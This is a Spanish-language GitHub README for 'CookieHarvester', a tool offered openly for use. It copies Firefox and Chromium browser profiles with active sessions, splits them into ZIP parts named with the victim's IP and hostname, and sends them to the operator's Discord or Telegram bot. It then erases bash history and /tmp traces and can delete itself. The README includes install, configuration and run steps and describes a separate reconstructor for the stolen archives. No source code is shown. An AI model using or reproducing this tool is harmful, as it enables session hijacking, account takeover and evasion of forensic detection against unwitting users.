# Proyecto

```
 ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗███████╗
██╔════╝██╔═══██╗██╔═══██╗██║ ██╔╝██║██╔════╝
██║     ██║   ██║██║   ██║█████╔╝ ██║█████╗  
██║     ██║   ██║██║   ██║██╔═██╗ ██║██╔══╝  
╚██████╗╚██████╔╝╚██████╔╝██║  ██╗██║███████╗
 ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝

██╗  ██╗ █████╗ ██████╗ ██╗   ██╗███████╗███████╗████████╗███████╗██████╗ 
██║  ██║██╔══██╗██╔══██╗██║   ██║██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗
███████║███████║██████╔╝██║   ██║█████╗  ███████╗   ██║   █████╗  ██████╔╝
██╔══██║██╔══██║██╔══██╗╚██╗ ██╔╝██╔══╝  ╚════██║   ██║   ██╔══╝  ██╔══██╗
██║  ██║██║  ██║██║  ██║ ╚████╔╝ ███████╗███████║   ██║   ███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
```

**CookieHarvester** — Extrae perfiles de navegadores (Firefox/Chromium), los comprime en ZIP de 8 MB y los envía a un servidor configurado. Luego limpia rastros y se autodestruye (opcional).

![Status](https://img.shields.io/badge/status-en%20desarrollo-yellow)
![License](https://img.shields.io/badge/license-MIT-blue)
![Python](https://img.shields.io/badge/python-3.10+-blue)
![Stable](https://img.shields.io/badge/estable-SI-green)

---

## Tabla de Contenidos
- [Descripción](#descripción)
- [Estructura](#estructura)
- [Características](#características)
- [Requisitos](#requisitos)
- [Instalación](#instalación)
- [Configuración](#configuración)
- [Uso](#uso)
- [Reconstructor](#reconstructor)
- [Autor](#autor)

---

## Descripción

CookieHarvester copia los perfiles de navegadores con sesiones activas a `/tmp`, los divide en ZIP de máximo 8 MB y los envía al transporte configurado (Discord o Telegram). Si falla un envío, reintenta hasta 3 veces. Al finalizar, borra todo rastro y puede autodestruirse (`AUTODESTRUIR = True`).

Esta es la rama **MAIN**, con arquitectura modular: el core es independiente del transporte, y se puede cambiar de Discord a Telegram solo con una variable en el `.env`.

Requiere **Python 3.10+** y las librerías `requests` y `python-dotenv`. Si `requests` no está disponible, el script se elimina solo.

Descarguen la rama **Beta** para desarrollo propio.

---

## Estructura
Cookie Harvester tiene la siguiente estructura

```bash
CookieHarvester/
├── .env                   # Crear para credenciales.   
├── config.py              # Configuración global y carga del .env
├── main.py                # Orquestación del flujo
├── core/                  # Lógica de negocio (sin transporte)
│ ├── init.py
│ ├── navegadores.py       # Detección de navegadores abiertos
│ ├── perfiles.py          # Búsqueda de perfiles Firefox/Chrome/Brave
│ ├── copia.py             # Copia de carpetas de perfil
│ ├── info.py              # Generación de info.txt
│ ├── compresion.py        # ZIP + división en partes
│ └── limpieza.py          # Autodestrucción segura
└── transport/             # Capa de envío intercambiable
├── init.py                # Selector get_transport()
├── base.py                # Interfaz abstracta Transport
├── discord.py             # Implementación Discord
└── telegram.py            # Implementación Telegram
```

> Las versiones monolíticas anteriores están en la rama beta, en `CH-utilidades/` como referencia histórica, se utilizan como pruebas para bots o entornos Windows.

---

## Características

- **Análisis:** Detecta el navegador predeterminado y copia perfiles con sesiones a `/tmp`.
- **Compresión:** Divide los perfiles en ZIP de 8 MB, nombrados con IP, hostname, navegador, fecha y orden.
- **Envío:** Envía los paquetes al transporte configurado (Discord o Telegram). Reintenta hasta 3 veces si falla.
- **Limpieza:** Borra rastros en bash y `/tmp`. Se autodestruye si `AUTODESTRUIR = True`.

---

## Requisitos

- **Python 3.10+**
- **Librerías:** `requests`, `python-dotenv`
- **SO compatible:** Linux (Mint, Fedora 44 KDE)

---

## Instalación

Instalaremos la rama main
```bash
git clone https://github.com/CatsSociety/CookieHarvester.git
```
```bash
cd CookieHarvester/CookieHarvester
```
```bash
python3 -m venv venv && source venv/bin/activate
```
```bash
pip install requests python-dotenv
```

En Ubuntu 24.04 / Linux Mint 22 puede que necesites sudo apt install python3.12-venv antes de crear el venv (PEP 668)

---

## Configuracion

Crea un archivo `.env` en la raiz de `CookieHarvester`

```bash
# Credenciales

# Discord
API_Discord = "tu_clave_aqui"

# Telegram
TOKEN_TL = "numero de token de bot"
CHAT_ID = "numero de chat"

# Selector de transporte (discord | telegram), descomenta uno.
# TRANSPORT = "discord"
# TRANSPORT = "telegram"
```
Descomenta a cualquiera de los dos segun tu bot.

---
## Uso

Una vez, todo listo, probaremos la utilidad con:

```bash
cd CookieHarvester && python3 main.py
```
El script:
- Verifica requests.
- Lee el .env.
- Detecta navegadores abiertos.
- Busca perfiles de Firefox (y Chrome/Brave si SOPORTE_CHROME = True).
- Copia, comprime y divide cada perfil.
- Envía las partes por el transporte configurado.
- Envía un resumen final.
- Limpia /tmp y se autodestruye si AUTODESTRUIR = True.

---
## Reconstructor

El reconstructor es offline. Toma los ZIP (completos o en partes) desde `~/Descargas/CookiesZIP/`, los une si hace falta, los descomprime en `~/Descargas/CookiesCompletos/` y limpia solo los archivos del paquete procesado.

Teniendo la siguiente estructura:

```bash
Reconstructor/
├── config.py
├── main.py
└── core/
    ├── nombres.py
    ├── verificacion.py
    ├── ensamblado.py
    ├── extraccion.py
    └── limpieza.py
```
Una vez tenemos los archivos zip en la carpeta solicita.
Entonces, podemos utilizar a el `Reconstructor` para armar el zip final:

```bash
cd Reconstructor
```
```bash
python3 main.py
```

## Autor
- Github: `@Bankai-HackingDev`

---
